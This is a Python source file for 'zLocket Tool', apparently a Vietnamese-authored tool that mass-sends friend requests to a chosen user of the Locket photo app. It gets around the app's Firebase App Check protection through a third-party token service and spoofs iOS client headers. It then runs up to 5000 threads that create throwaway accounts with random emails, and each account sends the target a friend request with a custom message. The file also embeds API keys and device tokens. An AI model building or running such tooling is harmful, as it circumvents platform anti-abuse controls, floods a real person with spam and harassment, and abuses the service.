# ==================================
#!/usr/bin/env python
# coding: utf-8
# Telegram: @gnolswft
# Version: 1.0.4
# Github: https://github.com/log-xyanua
# Description: zLocket Tool Open Source
# ==================================
import os, re, time, queue, shutil, ctypes, random, threading
import requests
from tqdm import tqdm
from getpass import getpass
from urllib.parse import urlparse, urlencode, parse_qs
from typing import Dict, List, Optional, Tuple
from colorama import init, Fore, Style
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from concurrent.futures import ThreadPoolExecutor, wait, TimeoutError
init()
class zLocket:
    def __init__(self,device_token: str = "",target_friend_uid: str = "",num_threads: int = 1,note_target: str = "",):
        self.messages: List[str] = []
        self.device_token = device_token
        self.firebase_app_check_token = ""
        self.target_friend_uid = target_friend_uid
        self.num_threads = num_threads
        self.note_target = note_target
        self.firebase_api_key = "AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
        self.api_locket = "https://api.locketcamera.com"
        self.firebase_auth = (
            "https://www.googleapis.com/identitytoolkit/v3/relyingparty"
        )
        self.firebase_app_check = "https://api.thanhdieu.com/firebaseappcheck"
        self.restore_url = "https://url.thanhdieu.com/api/short"
        self.proxy_url = None
        self.request_timeout = 30
        self.API_KEY = None
        self.NAME_TOOL = "zLocket Tool"
        self.VERSION_TOOL = "v1.0.4"
        self.base_headers = {
            "Host": "api.locketcamera.com",
            "Accept": "*/*",
            "baggage": "sentry-environment=production,sentry-public_key=78fa64317f434fd89d9cc728dd168f50,sentry-release=com.locket.Locket%401.121.1%2B1,sentry-trace_id=2cdda588ea0041ed93d052932b127a3e",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "sentry-trace": "2cdda588ea0041ed93d052932b127a3e-a3e2ba7a095d4f9d-0",
            "User-Agent": "com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1",
            "Firebase-Instance-ID-Token": "d7ChZwJHhEtsluXwXxbjmj:APA91bFoMIgxwf-2tmY9QLy82lKMEWL6S4d8vb9ctY3JxLLTQB1k6312TcgtqJjWFhQVz_J4wIFvE0Kfroztu1vbZDOFc65s0vvj68lNJM4XuJg1onEODiBG3r7YGrQLiHkBV1gEoJ5f",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
        }
        self.firebase_auth_headers = {
            "Host": "www.googleapis.com",
            "Accept": "*/*",
            "X-Client-Version": "iOS/FirebaseSDK/10.23.1/FirebaseCore-iOS",
            "X-Ios-Bundle-Identifier": "com.locket.Locket",
            "Accept-Language": "vi",
            "User-Agent": "FirebaseAuth.iOS/10.23.1 com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1",
            "Connection": "keep-alive",
            "X-Firebase-GMPID": "1:641029076083:ios:cc8eb46290d69b234fa606",
            "Content-Type": "application/json",
        }
        self.firebase_app_check_headers = {
            "Host": "api.thanhdieu.com",
            "Accept": "*/*",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
        }

        self.successful_runs = 0
        self.success_lock = threading.Lock()
        self.should_stop = False
        self.print_lock = threading.Lock()
        self.print_queue = queue.Queue()

        Anime.Fade(
            Center.Center(self.landing),
            Colors.red_to_yellow,
            Colorate.Vertical,
            enter=True,
        )
        while True:
            Write.Print(
                "[+] Nhập API KEY (Nhấn Enter để thoát) > ",
                Colors.red_to_yellow,
                interval=0.01,
            )
            self.API_KEY = input().strip()
            if not self.API_KEY:
                print(
                    f"{Fore.RED}⚠️ Đã bỏ nhập API KEY, thoát {self.NAME_TOOL}...{Style.RESET_ALL}"
                )
                os._exit(1)
            if self._check_api_key():
                break
            else:
                print(
                    f"{Fore.RED}⚠️ {self._res.get('msg', '⚠️ API KEY không hợp lệ, vui lòng nhập lại.')}{Style.RESET_ALL}"
                )
        if not self.firebase_app_check_token or not self._check_token_validity(
            self.firebase_app_check_token
        ):
            if self._get_token():
                self.firebase_app_check_token = self.firebase_app_check_token
            else:
                self.messages.append("❌ X-Firebase-AppCheck has expired or is died.")

    def _check_api_key(self) -> bool:
        try:
            response = requests.get(
                f"{self.firebase_app_check}?{self.reverse_str('yek')}={self.API_KEY}",
                headers=self.firebase_app_check_headers,
                timeout=self.request_timeout,
                verify=True,
            )
            response.raise_for_status()
            _res = response.json()
            self._res = _res
            if _res.get("errorCode") == 0:
                return True
            else:
                self.messages.append(
                    f"❌ API KEY không hợp lệ: {_res.get('msg', 'Lỗi không xác định')}"
                )
                return False
        except (requests.RequestException, ValueError) as e:
            self._res = {"msg": str(e)}
            self.messages.append(f"❌ ERROR: {str(e)}")
            return False

    def _get_token(self) -> bool:
        data = {
            "limited_use": False,
            "device_token": self.device_token,
        }
        is_completed = False
        os.system("cls")
        progress_bar = tqdm(
            total=100,
            desc=f"{Fore.YELLOW}Waiting for to load X-Firebase-AppCheck{Style.RESET_ALL}",
            bar_format=f"{Fore.GREEN}{{desc}}: {{n_fmt}}%{Style.RESET_ALL}",
            ncols=80,
        )

        def _loading():
            for i in range(100):
                if is_completed:
                    progress_bar.n = 100
                    progress_bar.refresh()
                    break
                progress_bar.update(1)
                time.sleep(0.05)
            progress_bar.close()

        progress_thread = threading.Thread(target=_loading)
        progress_thread.start()
        print("\033[F\033[K", end="")

        try:
            response = requests.post(
                f"{self.firebase_app_check}?key={self.API_KEY}",
                headers=self.firebase_app_check_headers,
                json=data,
                timeout=self.request_timeout,
                verify=True,
            )
            response.raise_for_status()
            _res = response.json()
            is_completed = True
            progress_thread.join()

            if _res.get("errorCode") == 1 or any(
                value == "" for value in _res.values()
            ):
                print(
                    f"{Fore.RED}[ERROR] {_res['msg'] if isinstance(_res, dict) and 'msg' in _res else '⚠️ X-Firebase-AppCheck has expired or is died.'}{Style.RESET_ALL}"
                )
                while True:
                    answer = (
                        Write.Input(
                            "[?] Bạn có muốn tiếp tục nhập X-Firebase-AppCheck thủ công? (yes/no) > ",
                            Colors.red_to_yellow,
                            interval=0.005,
                        )
                        .strip()
                        .lower()
                    )
                    if answer != "yes":
                        print(
                            f"{Fore.YELLOW}❌ Exited {self.NAME_TOOL}...{Style.RESET_ALL}"
                        )
                        os._exit(1)
                    manual_token = Write.Input(
                        "[+] Nhập X-Firebase-AppCheck (Press Enter to exit) > ",
                        Colors.red_to_yellow,
                        interval=0.005,
                    ).strip()
                    if not manual_token:
                        print(
                            f"{Fore.RED}⚠️ Đã hủy nhập X-Firebase-AppCheck, exited {self.NAME_TOOL}...{Style.RESET_ALL}"
                        )
                        os._exit(1)
                    self.firebase_app_check_token = manual_token
                    if self._check_token_validity(manual_token):
                        self.base_headers[
                            "X-Firebase-AppCheck"
                        ] = self.firebase_app_check_token
                        self.firebase_auth_headers[
                            "X-Firebase-AppCheck"
                        ] = self.firebase_app_check_token
                        print(
                            f"{Fore.GREEN}Loaded X-Firebase-AppCheck successfully! ☑️{Style.RESET_ALL}"
                        )
                        time.sleep(1)
                        print("\033[F\033[K", end="")
                        os.system("cls")
                        self._zlocket_input()
                        return True
                    else:
                        print(
                            f"{Fore.RED}⚠️ X-Firebase-AppCheck không hợp lệ, vui lòng nhập lại.{Style.RESET_ALL}"
                        )
                        continue

            if _res.get("errorCode") == 0 and "token" in _res:
                self.firebase_app_check_token = _res["token"]
                self.base_headers["X-Firebase-AppCheck"] = self.firebase_app_check_token
                self.firebase_auth_headers[
                    "X-Firebase-AppCheck"
                ] = self.firebase_app_check_token
                print(
                    f"{Fore.GREEN}Loaded X-Firebase-AppCheck successfully! ☑️{Style.RESET_ALL}"
                )
                time.sleep(1)
                print("\033c", end="")
                os.system("cls")
                self._zlocket_input()
                return True
            error_msg = _res.get("msg", "API error")
            self.messages.append(f"❌ Lỗi get token X-Firebase-AppCheck: {error_msg}")
            return False

        except requests.RequestException as e:
            is_completed = True
            progress_thread.join()
            self.messages.append(f"❌ Lỗi get token X-Firebase-AppCheck: {str(e)}")
            return False
        except ValueError as e:
            is_completed = True
            progress_thread.join()
            self.messages.append(f"❌ Lỗi get token X-Firebase-AppCheck: {str(e)}")
            return False

    def _zlocket_input(self):
        while True:
            self.target_friend_uid = Write.Input(
                "[+] Nhập URL Locket > ", Colors.red_to_yellow, interval=0.005
            ).strip()
            if not self.target_friend_uid:
                print(f"{Fore.RED}⚠️ Không Bỏ Trống URL Locket.{Style.RESET_ALL}")
                continue
            if not self.target_friend_uid.startswith(
                (
                    "https://locket.camera/invites/",
                    "https://locket.camera/links/",
                    "https://locket.cam/",
                )
            ):
                print(
                    f"{Fore.RED}⚠️ Url Locket đúng định dạng, hãy nhập link chính xác.{Style.RESET_ALL}"
                )
                continue
            self.target_friend_uid = self._extract_uid_from_url(self.target_friend_uid)
            if not self.target_friend_uid:
                print(
                    f"{Fore.RED}⚠️ Không tìm thấy tài khoản locket hoặc tài khoản này đã khoá lời mời kết bạn.{Style.RESET_ALL}"
                )
                continue
            break

        while True:
            try:
                self.num_threads = int(
                    Write.Input(
                        "[+] Nhập Threads (1 - 5000) > ",
                        Colors.red_to_yellow,
                        interval=0.005,
                    ).strip()
                )
                if self.num_threads < 1 or self.num_threads > 5000:
                    print(
                        f"{Fore.RED}⚠️ Số Threads Tối Thiểu Là 1, Tối Đa Là 5000, Số Threads Càng Cao {self.NAME_TOOL} Request Càng Nhiều.{Style.RESET_ALL}"
                    )
                    continue
                break
            except ValueError:
                print(f"{Fore.RED}⚠️ Threads Phải Là Số.{Style.RESET_ALL}")

        while True:
            self.note_target = Write.Input(
                "[+] Nhập Thông Điệp (Có Thể Để Trống) > ",
                Colors.red_to_yellow,
                interval=0.005,
            ).strip()
            if self.note_target == "":
                self.note_target = self.NAME_TOOL
                break
            if len(self.note_target) > 20:
                print(
                    f"{Fore.RED}⚠️ Thông Điệp Không Được Quá Dài (Tối Đa 20 Ký Tự).{Style.RESET_ALL}"
                )
                continue
            break
        if (
            Write.Input(
                "[?] Kích Hoạt Random Emoji (yes/no) > ",
                Colors.red_to_yellow,
                interval=0.005,
            )
            .strip()
            .lower()
            == "yes"
        ):
            self.enable_emoji = True
        else:
            self.enable_emoji = False

    landing = r"""
                                  __
                               _.-~  )
                    _..--~~~~,'   ,-/     _
                 .-'. . . .'   ,-','    ,' )
               ,'. . . _   ,--~,-'__..-'  ,'
             ,'. . .  (@)' ---~~~~      ,'
            /. . . . '~~             ,-'
           /. . . . .             ,-'
          ; . . . .  - .        ,'
         : . . . .       _     /
        . . . . .          `-.:
       . . . ./  - .          )
      .  . . |  _____..---.._/ ____ @gnolswft ____
~-----~~~~----~~~~             ~~
      Tool by @xyanua.
      Press [ENTER] to continue..."""[
        1:
    ]
    os.system("title 💰 zLocket Bulk Friend Request Tool by @gonlswft 💰")

    def banner(self):
        os.system("cls" if os.name == "nt" else "clear")
        text = """
███████╗░░░░░░██╗░░░░░░█████╗░░█████╗░██╗░░██╗███████╗████████╗  ████████╗░█████╗░░█████╗░██╗░░░░░
╚════██║░░░░░░██║░░░░░██╔══██╗██╔══██╗██║░██╔╝██╔════╝╚══██╔══╝  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
░░███╔═╝█████╗██║░░░░░██║░░██║██║░░╚═╝█████═╝░█████╗░░░░░██║░░░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
██╔══╝░░╚════╝██║░░░░░██║░░██║██║░░██╗██╔═██╗░██╔══╝░░░░░██║░░░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
███████╗░░░░░░███████╗╚█████╔╝╚█████╔╝██║░╚██╗███████╗░░░██║░░░  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗
╚══════╝░░░░░░╚══════╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝

"""
        lines = text.strip("\n").split("\n")
        colors = [Fore.CYAN, Fore.GREEN, Fore.YELLOW, Fore.MAGENTA, Fore.RED]
        _terminal = shutil.get_terminal_size().columns
        print("\n" * 1)
        print(f"{self.NAME_TOOL} {self.VERSION_TOOL}".rjust(100))
        print("")
        for color, line in zip(colors, lines):
            padding = (_terminal - len(line)) // 2
            print(color + " " * padding + line)

    def change_title(self, arg):
        if os.name == "nt":
            ctypes.windll.kernel32.SetConsoleTitleW(arg)

    def exit(self, sig, frame):
        os._exit(0)

    def reverse_str(self, s: str) -> str:
        return s[::-1]

    def _check_token_validity(self, token: str) -> bool:
        self.firebase_app_check_token = token
        self._eval_account()

        payload = {
            "data": {
                "email": self._random_email(),
                "password": self._random_pass(),
                "analytics": self._get_analytics_payload(),
                "client_email_verif": True,
                "client_token": self._random_str(40, "0123456789abcdef"),
                "platform": "ios",
            }
        }

        try:
            response = requests.post(
                f"{self.api_locket}/createAccountWithEmailPassword",
                headers=self.base_headers,
                json=payload,
                timeout=self.request_timeout,
                verify=True,
            )

            if response.status_code == 401:
                try:
                    error_data = response.json()
                    if (
                        error_data.get("error", {}).get("message") == "Unauthenticated"
                        and error_data.get("error", {}).get("status")
                        == "UNAUTHENTICATED"
                    ):
                        self.messages.append(
                            f"{Fore.RED}❌ Firebase Token Invalid: UNAUTHENTICATED (401){Style.RESET_ALL}"
                        )
                        return False
                except ValueError:
                    self.messages.append(
                        f"{Fore.RED}❌ Failed to parse error response for 401 status{Style.RESET_ALL}"
                    )
                    return False

            return response.status_code == 200

        except requests.RequestException as e:
            self.messages.append(
                f"{Fore.RED}❌ Error checking token validity: {str(e)}{Style.RESET_ALL}"
            )
            return False

    def _eval_account(self):
        self.base_headers["X-Firebase-AppCheck"] = self.firebase_app_check_token
        self.firebase_auth_headers[
            "X-Firebase-AppCheck"
        ] = self.firebase_app_check_token

    def _random_str(
        self, length: int = 10, chars: str = "abcdefghijklmnopqrstuvwxyz0123456789"
    ) -> str:
        return "".join(random.choice(chars) for _ in range(length))

    def _random_email(self) -> str:
        return f"{self._random_str(15)}@wusteam.com"

    def _random_pass(self) -> str:
        return self._random_str(12)

    def _random_name(self, length: int = 8) -> str:
        return self._random_str(length)

    def _random_emoji(self, length: int = 8) -> str:
        emojis = [
        '😀', '😂', '😍', '😎', '😜', '🤔', '🙃', '😇', '😈', '👻', '💀', '👽', '👾',
        '🐶', '🐱', '🐭', '🐹', '🐰', '🦊', '🦁', '🦄', '🐯', '🐻',
        '🌞', '🌝', '🌈', '🌺', '🌻', '🌿', '🌳', '🌊', '🌪', '💎', '📱', '💻', '🖥',
        '🍎', '🍇', '🍉', '🍓', '🍒', '🍍', '🥭', '🍑', '🍋', '🍊', '🥝', '🥥',
        '🌰', '🥔', '🥕', '🌽', '🌶', '🍔', '🍕', '🍖', '🍗', '🍣', '🍜',
        '🍩', '🍪', '🍫', '🍬', '🍭', '🍮', '🍧', '🍨', '🍦', '🥧',
        '🚗', '🚕', '🚙', '🚌', '🚎', '🚓', '🚑', '🚒', '🚐', '🚜', '🚁', '✈️', '🚂', '🚊',
        '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏯',
        '🎢', '🎡', '🎠', '🎪', '🎭', '🎤', '🎧', '🎷', '🎸', '🎹', '🎺', '🎻', '🎼'
    ]
        return "".join(random.choice(emojis) for _ in range(length))
    
    def _random_num(self, length=6) -> str:
        return "".join(random.choices("0123456789", k=length))

    def _rainbow_text(self, text: str) -> str:
        rainbow_colors = [
            Fore.RED,
            Fore.YELLOW,
            Fore.GREEN,
            Fore.CYAN,
            Fore.BLUE,
            Fore.MAGENTA,
        ]
        rainbow_str = ""
        for i, char in enumerate(text):
            rainbow_str += rainbow_colors[i % len(rainbow_colors)] + char
        return rainbow_str + Style.RESET_ALL

    def _get_analytics_payload(self) -> Dict:
        session_id = int(time.time() * 1000)
        return {
            "platform": "ios",
            "experiments": {
                "flag_4": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "43",
                },
                "flag_10": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "505",
                },
                "flag_6": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "2000",
                },
                "flag_3": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "501",
                },
                "flag_22": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "1203",
                },
                "flag_18": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "1203",
                },
                "flag_17": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "1010",
                },
                "flag_16": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "303",
                },
                "flag_15": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "501",
                },
                "flag_14": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "551",
                },
                "flag_25": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "23",
                },
            },
            "amplitude": {
                "device_id": "57A54C21-B633-418C-A6E3-4201E631178C",
                "session_id": {
                    "value": str(session_id),
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                },
            },
            "google_analytics": {"app_instance_id": "7E17CEB525FA4471BD6AA9CEC2C1BCB8"},
            "ios_version": "1.121.1.1",
        }

    def execute(
        self,
        url: str,
        method: str = "POST",
        headers: Dict = None,
        payload: Dict = None,
        thread_id: Optional[int] = None,
        step: Optional[str] = None,
    ) -> Optional[Dict]:
        prefix = (
            f"[Thread-{thread_id} | {step}]" if thread_id is not None and step else ""
        )
        attempt = 0
        max_attempts = 2
        headers = headers or {}

        while attempt < max_attempts:
            attempt += 1
            try:
                proxies = (
                    {"http": self.proxy_url, "https": self.proxy_url}
                    if self.proxy_url
                    else None
                )
                response = requests.request(
                    method=method,
                    url=url,
                    headers=headers,
                    json=payload,
                    timeout=self.request_timeout,
                    verify=True,
                    proxies=proxies,
                )

                if 200 <= response.status_code < 300:
                    return response.json() if response.text else True

                error = (
                    response.json()
                    if response.text
                    else {"error": {"message": "Lỗi không xác định"}}
                )
                error_message = error.get("error", {}).get(
                    "message", "Lỗi không xác định"
                )
                if "appcheck" in error_message.lower() and attempt < max_attempts:
                    self.messages.append(
                        f"❌ {prefix} Token hết hạn. Đang làm mới X-Firebase-AppCheck..."
                    )
                    if self._get_token():
                        headers["X-Firebase-AppCheck"] = self.firebase_app_check_token
                        continue
                    else:
                        self.messages.append(
                            f"❌ {prefix} Không thể làm mới X-Firebase-AppCheck."
                        )
                        return None
                return False

            except requests.RequestException as e:
                return False

        return None

    def _step1_create_account(
        self, thread_id: int
    ) -> Tuple[Optional[str], Optional[str]]:
        email = self._random_email()
        password = self._random_pass()
        payload = {
            "data": {
                "email": email,
                "password": password,
                "analytics": self._get_analytics_payload(),
                "client_email_verif": True,
                "client_token": self._random_str(40, "0123456789abcdef"),
                "platform": "ios",
            }
        }

        _res = self.execute(
            f"{self.api_locket}/createAccountWithEmailPassword",
            "POST",
            self.base_headers,
            payload,
            thread_id,
            "Bước 1",
        )

        if _res and _res.get("result", {}).get("status") == 200:
            return email, password
        return None, None

    def _step1b_sign_in(
        self, email: Optional[str], password: Optional[str], thread_id: int
    ) -> Optional[str]:
        if not email or not password:
            return None

        payload = {
            "email": email,
            "password": password,
            "clientType": "CLIENT_TYPE_IOS",
            "returnSecureToken": True,
        }

        _res = self.execute(
            f"{self.firebase_auth}/verifyPassword?key={self.firebase_api_key}",
            "POST",
            self.firebase_auth_headers,
            payload,
            thread_id,
            "Bước 1b",
        )

        if _res and "idToken" in _res:
            return _res["idToken"]
        return None

    def _step2_finalize_user(
        self, id_token: Optional[str], thread_id: int, note_target: Optional[str]
    ) -> bool:
        if not id_token:
            return False

        first_name = f"{(note_target or {self.NAME_TOOL}).rstrip()}"
        self.last_name = ""
        if hasattr(self, "enable_emoji") and self.enable_emoji:
            self.last_name = self._random_emoji(5)
        username = self._random_name()

        payload = {
            "data": {
                "analytics": self._get_analytics_payload(),
                "username": username,
                "last_name": self.last_name,
                "require_username": True,
                "first_name": first_name,
            }
        }

        headers = self.base_headers.copy()
        headers["Authorization"] = f"Bearer {id_token}"

        result = self.execute(
            f"{self.api_locket}/finalizeTemporaryUser",
            "POST",
            headers,
            payload,
            thread_id,
            "Bước 2",
        )

        return bool(result)

    def _step3_send_friend_request(
        self, id_token: Optional[str], thread_id: int
    ) -> bool:
        if not id_token:
            return False
        payload = {
            "data": {
                "user_uid": self.target_friend_uid,
                "source": "signUp",
                "platform": "iOS",
                "messenger": "Messages",
                "analytics": self._get_analytics_payload(),
                "invite_variant": {
                    "value": "1002",
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                },
                "share_history_eligible": True,
                "rollcall": False,
                "prompted_reengagement": False,
                "create_ofr_for_temp_users": False,
                "get_reengagement_status": False,
            }
        }

        headers = self.base_headers.copy()
        headers["Authorization"] = f"Bearer {id_token}"

        result = self.execute(
            f"{self.api_locket}/sendFriendRequest",
            "POST",
            headers,
            payload,
            thread_id,
            "Bước 3",
        )
        return bool(result)

    def _extract_uid_from_url(self, url: str) -> Optional[str]:
        real_url = self._convert_url(url)
        if not real_url:
            self.messages.append(f"❌ Không thể convert URL: {url}")
            return None

        parsed_url = urlparse(real_url)
        if parsed_url.hostname != "locket.camera":
            self.messages.append(f"❌ Locket URL không hợp lệ: {parsed_url.hostname}")
            return None

        if not parsed_url.path.startswith("/invites/"):
            self.messages.append(f"❌ Path Locket Sai Định Dạng: {parsed_url.path}")
            return None

        parts = parsed_url.path.split("/")
        if len(parts) > 2:
            full_uid = parts[2]
            uid = full_uid[:28]
            return uid

        self.messages.append("❌ Không tìm thấy UID trong URL Locket")
        return None

    def _convert_url(self, url: str) -> str:
        if url.startswith("https://locket.camera/invites/"):
            return url
        if url.startswith("https://locket.cam/"):
            try:
                resp = requests.get(
                    url,
                    headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
                    },
                    timeout=self.request_timeout,
                )
                if resp.status_code == 200:
                    match = re.search(
                        r'window\.location\.href\s*=\s*"([^"]+)"', resp.text
                    )
                    if match:
                        parsed = urlparse(match.group(1))
                        query = parse_qs(parsed.query)
                        enc_link = query.get("link", [None])[0]
                        if enc_link:
                            return enc_link
                        else:
                            self.messages.append(
                                "❌ Không thể get Locket UID từ locket.cam."
                            )
                            return ""
                    else:
                        self.messages.append("❌ Không thể bypass được locket.cam.")
                        return ""
                else:
                    self.messages.append(
                        f"❌ Lỗi khi tải trang locket.cam: {resp.status_code}"
                    )
                    return ""
            except Exception as e:
                self.messages.append(f"❌ ERROR:{e}")
                return ""
        payload = {"type": "toLong", "kind": "url.thanhdieu.com", "url": url}
        headers = {
            "Accept": "*/*",
            "Accept-Language": "vi",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
        }
        try:
            response = requests.post(
                self.restore_url,
                headers=headers,
                data=urlencode(payload),
                timeout=self.request_timeout,
                verify=True,
            )
            response.raise_for_status()
            _res = response.json()
            if _res.get("status") == 1 and "url" in _res:
                return _res["url"]
            # error_msg = _res.get('message', str(_res)) if 'message' in _res else 'API từ chối phản hồi'
            self.messages.append("❌ Lỗi kết nối tới API Url.ThanhDieu.Com")
            return ""
        except requests.RequestException:
            self.messages.append("❌ Lỗi kết nối tới API Url.ThanhDieu.Com")
            return ""
        except ValueError:
            self.messages.append("❌ Lỗi kết nối tới API Url.ThanhDieu.Com")
            return ""

    def zlocket(self, thread_id: int):
        try:
            email, password = self._step1_create_account(thread_id)
            if not email or not password:
                return False
            id_token = self._step1b_sign_in(email, password, thread_id)
            if not id_token:
                return False
            if not self._step2_finalize_user(id_token, thread_id, self.note_target):
                return False
            success = self._step3_send_friend_request(id_token, thread_id)
            if success:
                with self.success_lock:
                    self.successful_runs += 1
                    if self.successful_runs >= self.num_threads * 10:
                        self.should_stop = True
                colored_time = self._rainbow_text(
                    "[" + time.strftime("%H:%M:%S %d/%m/%Y") + "]"
                )
                colored_user = f"{Fore.RED}Message: [{Fore.YELLOW}{self.note_target + self.last_name}{Style.RESET_ALL}]"
                colored_separator = f"{Fore.GREEN}|{Style.RESET_ALL}"
                colored_target = f"{Fore.RED}Locket UID: [{Fore.WHITE}{Fore.YELLOW}{self.target_friend_uid or 'Không xác định'}{Style.RESET_ALL}]"
                self.print_queue.put(
                    (
                        f"{Fore.MAGENTA}ID-{self._random_num(5)} {colored_separator}{Style.RESET_ALL} {colored_time} {colored_separator} {colored_user} "
                        f"{colored_separator} {colored_target} "
                        f"({Fore.GREEN}{self.successful_runs}{Style.RESET_ALL}/"
                        f"{Fore.RED}{self.num_threads * 10}{Style.RESET_ALL})"
                    )
                )
                return True
            return False
        except Exception as e:
            return False

    def task_worker(self, thread_id: int):
        try:
            self.zlocket(thread_id)
        except Exception as e:
            self.messages.append(f"❌ Thread-{thread_id} error: {str(e)}")

    def run(self, target: str = None, threads: int = None, note: str = None) -> None:
        target = target or self.target_friend_uid
        threads = threads or self.num_threads
        note = note or self.note_target
        self.should_stop = False
        self.successful_runs = 0
        cycle_count = 0

        printer_thread = threading.Thread(target=self.printer_worker)
        printer_thread.daemon = True
        printer_thread.start()

        print("")
        print(
            "".join(
                [
                    f"{[Fore.MAGENTA, Fore.LIGHTMAGENTA_EX, Fore.LIGHTBLUE_EX, Fore.CYAN, Fore.LIGHTGREEN_EX, Fore.GREEN][i * 6 // len('»»————————————————————————————————————————««')]}{c}"
                    for i, c in enumerate(
                        "»»————————————————————————————————————————««"
                    )
                ]
            )
            + Style.RESET_ALL
        )
        print(
            f"""\033[1;32m[+] Locket UID: {target or 'None'} 
\033[35m[+] Message: {note + getattr(self, 'last_name', '') or 'None'}
\033[34m[+] Threads: {threads or 'None'}
\033[33m[+] Emojis: {'ON' if hasattr(self, "enable_emoji") and self.enable_emoji else 'OFF'}
\033[0;31m[+] Telegram: @gnolswft"""
        )
        print(
            "".join(
                [
                    c
                    for i, c in enumerate(
                        "»»————————————————————————————————————————««"
                    )
                    for c in [
                        f"{[Fore.MAGENTA, Fore.LIGHTMAGENTA_EX, Fore.LIGHTBLUE_EX, Fore.CYAN, Fore.LIGHTGREEN_EX, Fore.GREEN][i * 6 // len('»»————————————————————————————————————————««')]}{c}"
                    ]
                ]
            )
            + Style.RESET_ALL
        )
        print(
            f"{Fore.GREEN}Starting attack with {threads} concurrent threads...{Style.RESET_ALL}"
        )
        try:
            while True:
                if self.should_stop or self.successful_runs >= threads * 5:
                    break
                cycle_count += 1
                thread_list = []
                start_time = time.time()
                for i in range(threads):
                    if self.should_stop or self.successful_runs >= threads * 5:
                        break
                    t = threading.Thread(target=self.task_worker, args=(i + 1,))
                    t.daemon = True
                    thread_list.append(t)
                    t.start()
                for t in thread_list:
                    t.join(timeout=max(0, self.request_timeout - (time.time() - start_time)))
                if time.time() - start_time > self.request_timeout:
                    print(
                        f"{Fore.RED}⚠️ Thread {cycle_count} failed, trying to the next thread.{Style.RESET_ALL}"
                    )

            print(
                f"{Fore.RED}Completed! Sent {self.successful_runs} friend requests.{Style.RESET_ALL}"
            )
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}Stopping all threads...{Style.RESET_ALL}")
            self.should_stop = True
            print(
                f"{Fore.GREEN}Completed {self.successful_runs} friend requests before stopping.{Style.RESET_ALL}"
            )
        finally:
            self.should_stop = True
            printer_thread.join(timeout=1.0)

    def printer_worker(self):
        while not self.should_stop:
            try:
                message = self.print_queue.get(timeout=0.1)
                with self.print_lock:
                    print(message)
                self.print_queue.task_done()
            except queue.Empty:
                time.sleep(0.01)
            except Exception:
                pass

if __name__ == "__main__":
    locket = zLocket()
    locket.banner()
    locket.run(locket.target_friend_uid, locket.num_threads, locket.note_target)
